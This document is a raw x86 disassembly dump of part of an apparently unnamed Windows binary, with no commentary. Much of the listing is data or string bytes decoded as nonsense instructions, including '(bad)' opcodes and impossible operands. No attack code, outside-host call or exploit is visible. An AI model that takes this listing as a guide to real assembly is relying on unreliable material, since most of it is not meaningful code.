  423ea6:	jae    0x423ef6
  423ea8:	inc    ecx
  423ea9:	dec    esi
  423eaa:	xor    BYTE PTR [esi+0x40],cl
  423ead:	dec    esi
  423eae:	pop    esp
  423eaf:	pop    ebp
  423eb0:	pop    edi
  423eb1:	push   edx
  423eb2:	cmp    DWORD PTR [esi+0x79],ecx
  423eb5:	dec    esi
  423eb6:	xor    BYTE PTR [esi-0x79],cl
  423eb9:	dec    edi
  423eba:	cmp    eax,0x3e4faf4e
  423ebf:	dec    esi
  423ec0:	js     0x423f10
  423ec2:	cmp    ecx,DWORD PTR [esi-0x64]
  423ec5:	dec    edi
  423ec6:	inc    esp
  423ec7:	dec    esi
  423ec8:	mov    DWORD PTR [edi+0x41],ecx
  423ecb:	dec    esi
  423ecc:	xor    BYTE PTR [esi+0x40],cl
  423ecf:	dec    esi
  423ed0:	pop    esp
  423ed1:	ins    DWORD PTR es:[edi],dx
  423ed2:	pop    edi
  423ed3:	bound  edi,QWORD PTR [ecx]
  423ed5:	dec    esi
  423ed6:	jns    0x423f26
  423ed8:	xor    BYTE PTR [esi-0x80],cl
  423edb:	dec    edi
  423edc:	cmp    eax,0x394e734e
  423ee1:	dec    esi
  423ee2:	mov    ds:0x304e3a4f,al
  423ee7:	dec    esi
  423ee8:	inc    esi
  423ee9:	dec    esi
  423eea:	pop    esp
  423eeb:	jge    0x423f4c
  423eed:	jb     0x423f5e
  423eef:	sub    BYTE PTR [esi-0x7d],0x7e
  423ef3:	xchg   ebx,eax
  423ef4:	jns    0x423e86
  423ef6:	aas    
  423ef7:	dec    esi
  423ef8:	test   BYTE PTR [edi+0x30],cl
  423efb:	dec    esi
  423efc:	test   BYTE PTR [edi+0x3c],cl
  423eff:	dec    esi
  423f00:	mov    ds:0x734e394f,al
  423f05:	dec    esi
  423f06:	inc    ebp
  423f07:	dec    esi
  423f08:	xor    BYTE PTR [esi+0x44],cl
  423f0b:	dec    esi
  423f0c:	pop    esp
  423f0d:	lea    ebx,[edi-0x7e]
  423f10:	outs   dx,DWORD PTR ds:[esi]
  423f11:	xchg   edx,eax
  423f12:	outs   dx,BYTE PTR ds:[esi]
  423f13:	xchg   ebx,eax
  423f14:	jle    0x423eb9
  423f16:	jns    0x423eb8
  423f18:	aas    
  423f19:	dec    esi
  423f1a:	test   BYTE PTR [edi+0x30],cl
  423f1d:	dec    esi
  423f1e:	test   BYTE PTR [edi+0x3c],cl
  423f21:	dec    esi
  423f22:	mov    ds:0x894e394f,al
  423f27:	dec    edi
  423f28:	inc    ebp
  423f29:	dec    esi
  423f2a:	xor    BYTE PTR [esi+0x44],cl
  423f2d:	dec    esi
  423f2e:	pop    esp
  423f2f:	popf   
  423f30:	pop    edi
  423f31:	xchg   edx,eax
  423f32:	outs   dx,DWORD PTR ds:[esi]
  423f33:	mov    ds:0xb37ea36e,al
  423f38:	jns    0x423eea
  423f3a:	aas    
  423f3b:	dec    esi
  423f3c:	mov    cs,WORD PTR [edi+0x30]
  423f3f:	dec    esi
  423f40:	lods   al,BYTE PTR ds:[esi]
  423f41:	dec    edi
  423f42:	cmp    eax,0x394e734e
  423f47:	dec    esi
  423f48:	mov    eax,ds:0x304e3a4f
  423f4d:	dec    esi
  423f4e:	inc    esp
  423f4f:	dec    esi
  423f50:	pop    esp
  423f51:	lods   eax,DWORD PTR ds:[esi]
  423f52:	pop    edi
  423f53:	mov    ds:0xb36eb26f,al
  423f58:	jle    0x423f1d
  423f5a:	jns    0x423f1c
  423f5c:	aas    
  423f5d:	dec    esi
  423f5e:	mov    cs,WORD PTR [edi+0x30]
  423f61:	dec    esi
  423f62:	lods   al,BYTE PTR ds:[esi]
  423f63:	dec    edi
  423f64:	cmp    eax,0x394e7e4e
  423f69:	dec    esi
  423f6a:	lahf   
  423f6b:	dec    edi
  423f6c:	cmp    ecx,DWORD PTR [esi+0x30]
  423f6f:	dec    esi
  423f70:	inc    ebp
  423f71:	dec    esi
  423f72:	pop    esp
  423f73:	mov    ebp,0xc26fb25f
  423f78:	outs   dx,BYTE PTR ds:[esi]
  423f79:	ret    
  423f7a:	jle    0x423f4f
  423f7c:	jns    0x423f4e
  423f7e:	aas    
  423f7f:	dec    esi
  423f80:	mov    cs,WORD PTR [edi+0x30]
  423f83:	dec    esi
  423f84:	lods   al,BYTE PTR ds:[esi]
  423f85:	dec    edi
  423f86:	cmp    eax,0x394f804e
  423f8b:	dec    esi
  423f8c:	lods   al,BYTE PTR ds:[esi]
  423f8d:	dec    edi
  423f8e:	cmp    cl,BYTE PTR [esi+0x30]
  423f91:	dec    esi
  423f92:	inc    esi
  423f93:	dec    esi
  423f94:	pop    esp
  423f95:	int    0x5f
  423f97:	ret    0xd26f
  423f9a:	outs   dx,BYTE PTR ds:[esi]
  423f9b:	sar    DWORD PTR [esi-0x1d],cl
  423f9e:	jns    0x423f80
  423fa0:	aas    
  423fa1:	dec    esi
  423fa2:	mov    cs,WORD PTR [edi+0x30]
  423fa5:	dec    esi
  423fa6:	lods   al,BYTE PTR ds:[esi]
  423fa7:	dec    edi
  423fa8:	cmp    eax,0x394f834e
  423fad:	dec    esi
  423fae:	mov    ds:0x304e3a4f,al
  423fb3:	dec    esi
  423fb4:	inc    esp
  423fb5:	dec    esi
  423fb6:	pop    esp
  423fb7:	fstp   QWORD PTR [edi-0x2e]
  423fba:	outs   dx,DWORD PTR ds:[esi]
  423fbb:	loop   0x42402b
  423fbd:	jecxz  0x42403d
  423fbf:	repz jns 0x423fb2
  423fc2:	aas    
  423fc3:	dec    esi
  423fc4:	lea    ecx,[edi+0x30]
  423fc7:	dec    esi
  423fc8:	lahf   
  423fc9:	dec    edi
  423fca:	cmp    eax,0x3c4fa04e
  423fcf:	dec    esi
  423fd0:	xor    BYTE PTR [esi+0x3f],cl
  423fd3:	dec    esi
  423fd4:	pop    esp
  423fd5:	in     eax,dx
  423fd6:	pop    edi
  423fd7:	loop   0x424048
  423fd9:	repnz outs dx,BYTE PTR ds:[esi]
  423fdb:	repz jle 0x423fe1
  423fde:	jns    0x423fe0
  423fe0:	jle    0x423ff5
  423fe2:	jns    0x423ff4
  423fe4:	cmp    al,0x4e
  423fe6:	jg     0x424036
  423fe8:	xor    BYTE PTR [esi-0x65],cl
  423feb:	dec    edi
  423fec:	xor    cl,BYTE PTR [esi-0x80]
  423fef:	dec    edi
  423ff0:	cmp    al,0x4e
  423ff2:	lods   eax,DWORD PTR ds:[esi]
  423ff3:	dec    edi
  423ff4:	cmp    ecx,DWORD PTR [esi+0x30]
  423ff7:	dec    esi
  423ff8:	inc    ebp
  423ff9:	dec    esi
  423ffa:	pop    esp
  423ffb:	or     eax,0x126f025f
  424000:	outs   dx,BYTE PTR ds:[esi]
  424001:	adc    edi,DWORD PTR [esi+0x23]
  424004:	jns    0x424026
  424006:	aas    
  424007:	dec    esi
  424008:	add    BYTE PTR [eax],al
  42400a:	xchg   edx,eax
  42400b:	ds inc edx
  42400d:	add    BYTE PTR [esi-0x71ffbdc0],al
  424013:	inc    eax
  424014:	inc    edx
  424015:	add    BYTE PTR [edx],ch
  424017:	inc    edx
  424018:	inc    edx
  424019:	add    BYTE PTR [edx+0x1a004241],dl
  42401f:	inc    edx
  424020:	inc    edx
  424021:	add    BYTE PTR [esi+0x40],ch
  424024:	inc    edx
  424025:	add    BYTE PTR [edx+0x40],dh
  424028:	inc    edx
  424029:	add    BYTE PTR [esi],dl
  42402b:	inc    edx
  42402c:	inc    edx
  42402d:	add    dh,dl
  42402f:	inc    eax
  424030:	inc    edx
  424031:	add    BYTE PTR ds:0x36f89ca9,cl
  424037:	mov    edx,0x408af89c
  42403c:	inc    edx
  42403d:	add    BYTE PTR [esi+0x41],cl
  424040:	inc    edx
  424041:	add    BYTE PTR [edx+0x41],ah
  424044:	inc    edx
  424045:	add    BYTE PTR [esi+0x41],ch
  424048:	inc    edx
  424049:	add    BYTE PTR [esi+0x41],bh
  42404c:	inc    edx
  42404d:	add    dl,al
  42404f:	inc    eax
  424050:	inc    edx
  424051:	add    BYTE PTR [esi-0x1dffbdc2],cl
  424057:	inc    eax
  424058:	inc    edx
  424059:	add    dl,dl
  42405b:	inc    eax
  42405c:	inc    edx
  42405d:	add    BYTE PTR [esi],ch
  42405f:	inc    edx
  424060:	inc    edx
  424061:	add    BYTE PTR [esi+0x19f89c85],dh
  424067:	or     edx,DWORD PTR [edi]
  424069:	adc    DWORD PTR [esi+0x14004240],0x881161c
  424073:	or     eax,0x705
  424078:	inc    eax
  424079:	add    BYTE PTR [edx],bh
  42407b:	inc    edx
  42407c:	ds ds mov edx,0x6d004287
  424083:	push   ebp
  424084:	inc    esp
  424085:	imul   ecx,DWORD PTR [eax],0x86275fa
  42408b:	in     eax,dx
  42408c:	inc    BYTE PTR [edi]
  42408e:	aas    
  42408f:	cli    
  424090:	mov    ds:0x42407e05,eax
  424095:	add    BYTE PTR [ebp-0x4a07636b],dh
  42409b:	xchg   esi,eax
  42409c:	pushf  
  42409d:	clc    
  42409e:	mov    ah,0x95
  4240a0:	pushf  
  4240a1:	clc    
  4240a2:	mov    ebx,0xbaf89c95
  4240a7:	xchg   ebp,eax
  4240a8:	pushf  
  4240a9:	clc    
  4240aa:	mov    ecx,0xb8f89c95
  4240af:	xchg   ebp,eax
  4240b0:	pushf  
  4240b1:	clc    
  4240b2:	mov    edi,0xbef89c95
  4240b7:	xchg   ebp,eax
  4240b8:	pushf  
  4240b9:	clc    
  4240ba:	mov    ebp,0xa6f89c95
  4240bf:	xchg   ebp,eax
  4240c0:	pushf  
  4240c1:	clc    
  4240c2:	jmp    0x423e:0x866003f9
  4240c9:	add    BYTE PTR [eax+edx*2+0x42],bh
  4240cd:	add    BYTE PTR [ebx+0x77],dl
  4240d0:	jbe    0x424122
  4240d2:	mov    dh,0x85
  4240d4:	pushf  
  4240d5:	clc    
  4240d6:	sbb    ecx,ebp
  4240d8:	push   eax
  4240d9:	pop    es
  4240da:	in     eax,0x7
  4240dc:	add    BYTE PTR [eax],al
  4240de:	cmp    BYTE PTR [esi],0x42
  4240e1:	add    BYTE PTR [ebx],bl
  4240e3:	or     eax,DWORD PTR [esi+ecx*1]
	...
  424116:	jl     0x424168
  424118:	inc    edx
  424119:	add    BYTE PTR [esi+0x68f89c85],dh
  42411f:	jne    0x42419a
  424121:	je     0x424198
  424123:	jns    0x424199
  424125:	jb     0x42418f
  424127:	addr16 pushw 0x68
  42412b:	imul   esp,DWORD PTR [bx+0x68],0x0
  424130:	add    BYTE PTR [eax],al
  424132:	addr16 pushw 0x68
  424136:	addr16 push 0x67
  424139:	pushw  0x6b6a
  42413d:	push   0x676b67
	...
  42414a:	jle    0x4240d2
  42414c:	inc    eax
  42414d:	add    BYTE PTR [ebp-0x5db060b1],ah
  424153:	dec    edi
  424154:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424155:	dec    edi
  424156:	lahf   
  424157:	dec    edi
  424158:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424159:	dec    edi
  42415a:	ins    DWORD PTR es:[edi],dx
  42415b:	dec    esi
  42415c:	bound  ecx,QWORD PTR [esi+0x30]
  42415f:	dec    esi
  424160:	add    BYTE PTR [eax],al
  424162:	cdq    
  424163:	dec    edi
  424164:	pushf  
  424165:	dec    edi
  424166:	fwait
  424167:	dec    edi
  424168:	ins    DWORD PTR es:[edi],dx
  424169:	dec    esi
  42416a:	bound  ecx,QWORD PTR [esi+0x30]
  42416d:	dec    esi
  42416e:	scas   eax,DWORD PTR es:[edi]
  42416f:	dec    edi
  424170:	lods   eax,DWORD PTR ds:[esi]
  424171:	dec    edi
  424172:	lahf   
  424173:	dec    edi
  424174:	mov    ds:0x624e6d4f,al
  424179:	dec    esi
  42417a:	xor    BYTE PTR [esi+0x0],cl
  42417d:	add    BYTE PTR [ebp-0x5bb067b1],ch
  424183:	dec    edi
  424184:	test   eax,0xa04f934f
  424189:	dec    edi
  42418a:	fwait
  42418b:	dec    edi
  42418c:	xor    BYTE PTR [esi+0x0],cl
  42418f:	add    BYTE PTR [eax],al
  424191:	add    BYTE PTR [ebp+edi*2-0x62737274],cl
  424198:	mov    WORD PTR [ebp-0x32734274],gs
  42419e:	mov    ebp,ds
  4241a0:	mov    ebp,gs
  4241a2:	mov    ebp,?
  4241a4:	mov    WORD PTR ds:0x2d8c1d8c,cs
  4241aa:	mov    WORD PTR ds:0x6d8c5d8c,?
  4241b0:	mov    WORD PTR [edx-0x74],?
  4241b3:	jae    0x424141
  4241b5:	jo     0x424143
  4241b7:	jno    0x424145
  4241b9:	jbe    0x424147
  4241bb:	ja     0x424149
  4241bd:	je     0x42414b
  4241bf:	jne    0x42414d
  4241c1:	mov    cl,BYTE PTR [ebx+ecx*4-0x76737774]
  4241c8:	mov    WORD PTR [esi+0x7d9c7c8c],cs
  4241ce:	lods   al,BYTE PTR ds:[esi]
  4241cf:	jge    0x42418d
  4241d1:	jge    0x424171
  4241d3:	(bad)  
  4241d4:	jns    0x424249
  4241d6:	mov    ecx,0x7d738cb1
  4241db:	ins    DWORD PTR es:[edi],dx
  4241dc:	enter  0x9fc6,0x26
  4241e0:	jb     0x4241e5
  4241e2:	test   eax,0xb956bb17
  4241e7:	hlt    
  4241e8:	test   al,0x37
  4241ea:	test   al,0x7e
  4241ec:	fnstenv [ecx-0x6a]
  4241ef:	mov    cl,0x6a
  4241f1:	push   0xffffffce
  4241f3:	or     BYTE PTR [edx],bl
  4241f5:	xlat   BYTE PTR ds:[ebx]
  4241f6:	out    dx,eax
  4241f7:	add    eax,0x9321d7aa
  4241fc:	scas   al,BYTE PTR es:[edi]
  4241fd:	adc    DWORD PTR [esi],esp
  4241ff:	jge    0x424224
  424201:	fidiv  WORD PTR [edi]
  424203:	leave  
  424204:	hlt    
  424205:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424206:	cmp    ax,0x1fc8
  42420a:	mov    dh,cl
  42420c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42420d:	(bad)  
  42420e:	and    DWORD PTR [eax],ebx
  424210:	and    DWORD PTR [ecx+0x0],esi
  424213:	add    BYTE PTR [eax],al
  424215:	add    al,ch
  424217:	(bad)  [ebx+0x7]
  42421a:	cmc    
  42421b:	enter  0x301a,0x10
  42421f:	push   eax
  424220:	inc    edx
  424221:	add    BYTE PTR [ecx+0x66],dh
  424224:	jp     0x424294
  424226:	jbe    0x424268
  424228:	inc    edx
  424229:	add    dl,bl
  42422b:	inc    eax
  42422c:	inc    edx
  42422d:	add    BYTE PTR [eax],cl
  42422f:	in     eax,dx
  424230:	adc    al,BYTE PTR [edi]
  424232:	pop    ecx
  424233:	inc    ebx
  424234:	inc    edx
  424235:	outs   dx,BYTE PTR ds:[esi]
  424236:	popa   
  424237:	imul   eax,DWORD PTR [edx+0x61],0x6b
  42423b:	jne    0x4242ab
  42423d:	dec    ebx
  42423e:	je     0x4242a3
  424240:	bound  esp,QWORD PTR [edi+0x78]
  424243:	dec    eax
  424244:	bound  edx,QWORD PTR [ebx+0x53]
  424247:	inc    ebx
  424248:	push   ebp
  424249:	push   eax
  42424a:	ja     0x4242c6
  42424c:	jp     0x42429b
  42424e:	push   esi
  42424f:	arpl   WORD PTR gs:[ecx+0x45],si
  424253:	dec    edx
  424254:	dec    esi
  424255:	data16 ja 0x4242a6
  424258:	imul   ebp,DWORD PTR [eax+0x0],0x0
	...
  42426b:	add    BYTE PTR [eax],al
  42426d:	add    BYTE PTR [edi+0x6c],ch
  424270:	push   0x49657557
  424275:	imul   eax,DWORD PTR fs:[ecx+edi*2+0x54],0x62
  42427b:	push   edi
  42427c:	je     0x4242f3
  42427e:	push   0x66
  424280:	jbe    0x4242c4
  424282:	jo     0x4242cd
  424284:	dec    ebp
  424285:	dec    ebp
  424286:	pop    edx
  424287:	jp     0x4242e3
  424289:	jbe    0x4242d1
  42428b:	pop    ecx
  42428c:	jo     0x424306
  42428e:	push   edi
  42428f:	jbe    0x4242d8
  424291:	ja     0x4242d6
  424293:	js     0x4242dd
  424295:	jno    0x4242df
  424297:	inc    ebp
  424298:	inc    esp
  424299:	inc    esp
  42429a:	push   ecx
  42429b:	dec    edx
  42429c:	ins    BYTE PTR es:[edi],dx
  42429d:	dec    ebx
  42429e:	jbe    0x42430e
  4242a0:	pop    eax
  4242a1:	jbe    0x4242a3
  4242a3:	add    BYTE PTR [ecx+0x46],al
  4242a6:	jae    0x42431e
  4242a8:	dec    ebx
  4242a9:	gs js  0x424312
  4242ac:	ins    BYTE PTR es:[edi],dx
  4242ad:	jp     0x4242af
  4242af:	add    BYTE PTR [ebx+0x41],cl
  4242b2:	fs gs jno 0x424323
  4242b6:	push   ebx
  4242b7:	inc    ecx
  4242b8:	inc    ebx
  4242b9:	outs   dx,BYTE PTR ds:[esi]
  4242ba:	imul   esp,DWORD PTR [edi+0x7a],0x6f
  4242be:	push   edx
  4242bf:	push   ecx
  4242c0:	push   0x43000064
  4242c5:	pop    eax
  4242c6:	outs   dx,DWORD PTR ds:[esi]
  4242c7:	push   0x66694355
  4242cc:	dec    edi
  4242cd:	je     0x42431b
  4242cf:	jo     0x4242d1
  4242d1:	add    BYTE PTR [ebx+0x6f],dl
  4242d4:	inc    edi
  4242d5:	dec    esi
  4242d6:	outs   dx,DWORD PTR ds:[esi]
  4242d7:	pop    ecx
  4242d8:	inc    edi
  4242d9:	jb     0x424322
  4242db:	jns    0x424353
  4242dd:	inc    ecx
  4242de:	pop    eax
  4242df:	add    BYTE PTR [edi+0x67],dh
  4242e2:	dec    edi
  4242e3:	dec    esp
  4242e4:	dec    ebp
  4242e5:	inc    edx
  4242e6:	jno    0x424359
  4242e8:	jae    0x42433d
  4242ea:	push   eax
  4242eb:	arpl   WORD PTR [eax],ax
  4242ed:	add    BYTE PTR [ecx+edi*2+0x45],cl
  4242f1:	bound  ebp,QWORD PTR [ecx+0x46]
  4242f4:	dec    ecx
  4242f5:	ja     0x42433c
  4242f7:	dec    eax
  4242f8:	inc    ebp
  4242f9:	inc    edx
  4242fa:	push   ebx
  4242fb:	push   ecx
  4242fc:	add    BYTE PTR [eax],al
  4242fe:	outs   dx,BYTE PTR ds:[esi]
  4242ff:	dec    eax
  424300:	jno    0x42435b
  424302:	jbe    0x424350
  424304:	ins    BYTE PTR es:[edi],dx
  424305:	inc    edx
  424306:	push   0x73
  42430b:	add    BYTE PTR [eax],al
  42430d:	add    BYTE PTR [eax],al
  42430f:	add    BYTE PTR [eax],al
  424311:	add    BYTE PTR [edx+0x44],bl
  424314:	jbe    0x42435f
  424316:	imul   ecx,DWORD PTR [esi+0x6e],0x66
  42431a:	ins    DWORD PTR es:[di],dx
  42431c:	je     0x424365
  42431e:	ins    BYTE PTR es:[edi],dx
  42431f:	jae    0x42438b
  424321:	inc    esi
  424322:	ins    DWORD PTR es:[edi],dx
  424323:	je     0x42437b
  424325:	push   0x56584178
  42432a:	push   ebx
  42432b:	addr16 dec edx
  42432d:	jo     0x4243a1
  42432f:	js     0x4243a0
  424331:	pop    eax
  424332:	dec    ebx
  424333:	push   esp
  424334:	dec    esp
  424335:	jns    0x424382
  424337:	js     0x4243b1
  424339:	outs   dx,BYTE PTR ds:[esi]
  42433a:	pop    ecx
  42433b:	jae    0x4243ab
  42433d:	push   0x43644448
  424342:	arpl   WORD PTR [edx+0x55],sp
  424345:	push   0x42504e67
  42434a:	push   ebp
  42434b:	je     0x4243c2
  42434d:	addr16 dec edi
  42434f:	dec    esp
  424350:	inc    edx
  424351:	ins    DWORD PTR es:[edi],dx
  424352:	inc    esi
  424353:	inc    esi
  424354:	inc    esi
  424355:	arpl   WORD PTR [edx+0x47],bx
  424358:	push   ebp
  424359:	inc    ebx
  42435a:	popa   
  42435b:	push   edx
  42435c:	dec    esp
  42435d:	imul   ecx,DWORD PTR [ecx+0x43],0x54706a5a
  424364:	push   ecx
  424365:	push   ebx
  424366:	imul   ebp,DWORD PTR [ebx+0x52],0x444a454e
  42436d:	dec    edx
  42436e:	jns    0x4243d9
  424370:	push   edx
  424371:	inc    ebx
  424372:	jo     0x4243e9
  424374:	imul   ecx,DWORD PTR [ebx+0x50],0x48
  424378:	fs add al,dl
  42437b:	inc    edx
  42437c:	add    BYTE PTR [eax+edx*8],al
  42437f:	inc    edx
  424380:	add    BYTE PTR [eax],cl
  424382:	rol    BYTE PTR [edx+0x0],1
  424385:	or     al,0xd0
  424387:	inc    edx
  424388:	add    BYTE PTR [eax],dl
  42438a:	rol    BYTE PTR [edx+0x0],1
  42438d:	adc    al,0xd0
  42438f:	inc    edx
  424390:	add    BYTE PTR [eax],bl
  424392:	rol    BYTE PTR [edx+0x0],1
  424395:	sbb    al,0xd0
  424397:	inc    edx
  424398:	add    BYTE PTR [edi+0x37],al
  42439b:	cmp    BYTE PTR [edi+0x4b],bl
  42439e:	inc    ecx
  42439f:	aaa    
  4243a0:	dec    ecx
  4243a1:	ss pop edi
  4243a3:	xor    BYTE PTR [eax+0x35],dl
  4243a6:	dec    esi
  4243a7:	add    BYTE PTR [eax+0x49],cl
  4243aa:	xor    al,0x5f
  4243ac:	dec    esp
  4243ad:	inc    esp
  4243ae:	dec    esp
  4243af:	xor    bl,BYTE PTR [edi+0x35]
  4243b2:	dec    eax
  4243b3:	xor    BYTE PTR [eax],al
  4243b5:	dec    esp
  4243b6:	inc    ecx
  4243b7:	xor    al,0x5f
  4243b9:	dec    ebx
  4243ba:	pop    edx
  4243bb:	xor    esi,DWORD PTR [ebx]
  4243bd:	dec    ebp
  4243be:	pop    edi
  4243bf:	xor    al,0x0
  4243c1:	pop    ecx
  4243c2:	inc    esi
  4243c3:	push   eax
  4243c4:	aaa    
  4243c5:	xor    DWORD PTR [edx],esi
  4243c7:	pop    edi
  4243c8:	cmp    DWORD PTR [eax+eax*1+0x45],ecx
  4243cc:	xor    eax,0x33595f41
  4243d1:	aaa    
  4243d2:	push   edx
  4243d3:	xor    bl,BYTE PTR [edi+0x4c]
  4243d6:	pop    edx
  4243d7:	add    BYTE PTR [edx+0x45],cl
  4243da:	push   ebx
  4243db:	xor    DWORD PTR [edi+0x43],ebx
  4243de:	dec    esp
  4243df:	inc    esi
  4243e0:	add    BYTE PTR [eax+0x58],bl
  4243e3:	xor    eax,0x444e515f
  4243e8:	xor    eax,0x4300425f
  4243ed:	inc    ecx
  4243ee:	dec    ebx
  4243ef:	cmp    DWORD PTR ds:0x365f3939,esi
  4243f5:	xor    al,0x42
  4243f7:	pop    edi
  4243f8:	pop    eax
  4243f9:	push   edi
  4243fa:	add    BYTE PTR [ebx+0x45],cl
  4243fd:	cmp    DWORD PTR ss:[edi+0x56],ebx
  424401:	xor    eax,DWORD PTR [esi+0x4c]
  424404:	add    BYTE PTR [ebp+0x53],cl
  424407:	dec    edi
  424408:	pop    edi
  424409:	push   ebx
  42440a:	inc    ebx
  42440b:	xor    al,0x5f
  42440d:	inc    ebx
  42440e:	push   ebp
  42440f:	xor    eax,DWORD PTR [ecx+0x0]
  424412:	dec    esi
  424413:	inc    esi
  424414:	xor    eax,0x494f345f
  424419:	xor    ecx,DWORD PTR [esi+0x5f]
  42441c:	push   esp
  42441d:	cmp    BYTE PTR [esi+0x0],dl
  424420:	pop    edx
  424421:	xor    esi,DWORD PTR [esi]
  424423:	aaa    
  424424:	pop    edi
  424425:	xor    eax,0x5f363437
  42442a:	push   edi
  42442b:	add    BYTE PTR [ebp+0x4a],cl
  42442e:	push   edx
  42442f:	pop    edi
  424430:	xor    DWORD PTR [edx],esi
  424432:	inc    ebp
  424433:	inc    edx
  424434:	ss pop edi
  424436:	inc    ecx
  424437:	dec    ebx
  424438:	add    BYTE PTR [edx+0x54],cl
  42443b:	dec    edi
  42443c:	pop    edi
  42443d:	push   esp
  42443e:	cmp    BYTE PTR [eax],dh
  424440:	inc    edi
  424441:	add    BYTE PTR [ecx+esi*1+0x4d],al
  424445:	pop    edi
  424446:	xor    DWORD PTR [ebp+0x57],eax
  424449:	pop    edx
  42444a:	cmp    BYTE PTR ss:[edi+0x38],bl
  42444e:	inc    ebp
  42444f:	dec    edi
  424450:	add    BYTE PTR [eax+0x53],cl
  424453:	xor    DWORD PTR [ecx],edi
  424455:	pop    edi
  424456:	dec    ebx
  424457:	inc    edx
  424458:	push   esp
  424459:	pop    edi
  42445a:	push   esi
  42445b:	add    BYTE PTR [ecx+0x49],al
  42445e:	dec    edx
  42445f:	pop    edi
  424460:	xor    eax,0x33344d4d
  424465:	pop    edi
  424466:	push   ecx
  424467:	inc    esi
  424468:	inc    edi
  424469:	dec    edi
  42446a:	add    BYTE PTR [esi+0x4b],dl
  42446d:	push   edx
  42446e:	pop    edi
  42446f:	inc    ebx
  424470:	pop    ecx
  424471:	xor    ebx,DWORD PTR [edi+0x35]
  424474:	inc    edi
  424475:	dec    eax
  424476:	xor    BYTE PTR [edx+0x0],al
  424479:	push   esi
  42447a:	xor    eax,0x315f3452
  42447f:	ss inc esp
  424481:	xor    eax,0x5956004a
  424486:	inc    ecx
  424487:	pop    edi
  424488:	push   esi
  424489:	push   ebp
  42448a:	inc    ebp
  42448b:	pop    edi
  42448c:	xor    BYTE PTR [ecx],dh
  42448e:	add    BYTE PTR [edi+0x58],al
  424491:	dec    edx
  424492:	pop    edi
  424493:	inc    edi
  424494:	inc    esi
  424495:	push   esi
  424496:	dec    esp
  424497:	push   edi
  424498:	add    BYTE PTR [edi+0x35],al
  42449b:	dec    ebx
  42449c:	pop    edi
  42449d:	ss dec ebx
  42449f:	xor    esi,DWORD PTR ds:0x33005600
  4244a5:	add    BYTE PTR [edi+0x0],dl
  4244a8:	xor    eax,0x5f003600
  4244ad:	add    BYTE PTR [ecx+0x0],bl
  4244b0:	dec    eax
  4244b1:	add    BYTE PTR [ecx+0x0],bl
  4244b4:	inc    ebp
  4244b5:	add    BYTE PTR [eax+0x0],cl
  4244b8:	add    BYTE PTR [eax],al
  4244ba:	push   eax
  4244bb:	add    BYTE PTR [eax],dh
  4244bd:	add    BYTE PTR [ecx+0x0],bl
  4244c0:	pop    edi
  4244c1:	add    BYTE PTR [ecx+0x0],bl
  4244c4:	xor    al,BYTE PTR [eax]
  4244c6:	dec    edi
  4244c7:	add    BYTE PTR [ebx],dh
  4244c9:	add    BYTE PTR [edi+0x0],dl
  4244cc:	pop    edi
  4244cd:	add    BYTE PTR [eax+eax*1+0x4f],al
  4244d1:	add    BYTE PTR [ebx+0x0],dl
  4244d4:	add    BYTE PTR [eax],al
  4244d6:	dec    ebp
  4244d7:	add    BYTE PTR [esi+0x0],dl
  4244da:	push   esp
  4244db:	add    BYTE PTR [edi+0x0],bl
  4244de:	inc    edx
  4244df:	add    BYTE PTR [edx+0x0],dl
  4244e2:	xor    al,0x0
  4244e4:	pop    edi
  4244e5:	add    BYTE PTR [ecx+0x0],al
  4244e8:	push   esp
  4244e9:	add    BYTE PTR [edx+0x0],dl
  4244ec:	pop    edi
  4244ed:	add    BYTE PTR [edi+0x0],cl
  4244f0:	xor    eax,DWORD PTR [eax]
  4244f2:	inc    edx
  4244f3:	add    BYTE PTR [eax],al
  4244f5:	add    BYTE PTR [esi+0x0],cl
  4244f8:	cmp    BYTE PTR [eax],al
  4244fa:	push   eax
  4244fb:	add    BYTE PTR [eax],dh
  4244fd:	add    BYTE PTR [edi+0x0],bl
  424500:	push   edx
  424501:	add    BYTE PTR [edi+0x0],al
  424504:	inc    edx
  424505:	add    BYTE PTR [eax],bh
  424507:	add    BYTE PTR [eax+eax*1],dh
  42450a:	pop    edi
  42450b:	add    BYTE PTR [edi+0x0],cl
  42450e:	push   eax
  42450f:	add    BYTE PTR [esi],dh
  424511:	add    BYTE PTR [eax],al
  424513:	add    BYTE PTR [edx+0x0],bl
  424516:	pop    eax
  424517:	add    BYTE PTR [ecx],dh
  424519:	add    BYTE PTR [eax],bh
  42451b:	add    BYTE PTR [edi+0x0],bl
  42451e:	push   edi
  42451f:	add    BYTE PTR [edx+0x0],dl
  424522:	dec    ebx
  424523:	add    BYTE PTR [edi+0x0],bl
  424526:	inc    esp
  424527:	add    BYTE PTR [esi],dh
  424529:	add    BYTE PTR [ecx],bh
  42452b:	add    BYTE PTR [esi],dh
  42452d:	add    BYTE PTR [esi+0x0],dl
  424530:	add    BYTE PTR [eax],al
  424532:	push   ebp
  424533:	add    BYTE PTR [eax],dh
  424535:	add    BYTE PTR [eax+eax*1+0x5f],al
  424539:	add    BYTE PTR [edx+0x0],dl
  42453c:	dec    ecx
  42453d:	add    BYTE PTR [edi+0x0],cl
  424540:	xor    eax,DWORD PTR [eax]
  424542:	xor    eax,0x34005f00
  424547:	add    BYTE PTR [edi+0x0],cl
  42454a:	pop    ecx
  42454b:	add    BYTE PTR [eax],al
  42454d:	add    BYTE PTR [eax+eax*1+0x31],cl
  424551:	add    BYTE PTR [esi+0x0],al
  424554:	pop    edi
  424555:	add    BYTE PTR [ebp+0x0],cl
  424558:	dec    ebp
  424559:	add    BYTE PTR [eax],bh
  42455b:	add    BYTE PTR [esi],dh
  42455d:	add    BYTE PTR [edx+0x0],al
  424560:	dec    esp
  424561:	add    BYTE PTR [eax],al
  424563:	add    BYTE PTR [edx+0x0],al
  424566:	xor    eax,0x5f003500
  42456b:	add    BYTE PTR [eax+0x0],bl
  42456e:	inc    esp
  42456f:	add    BYTE PTR [edi+0x0],cl
  424572:	inc    ecx
  424573:	add    BYTE PTR [eax+eax*1],dh
  424576:	add    BYTE PTR [eax],al
  424578:	push   ecx
  424579:	add    BYTE PTR [eax],bh
  42457b:	add    BYTE PTR [ecx+0x0],dl
  42457e:	pop    edi
  42457f:	add    BYTE PTR [eax+eax*1+0x31],dl
  424583:	add    BYTE PTR [ecx],dh
  424585:	add    BYTE PTR [eax],bh
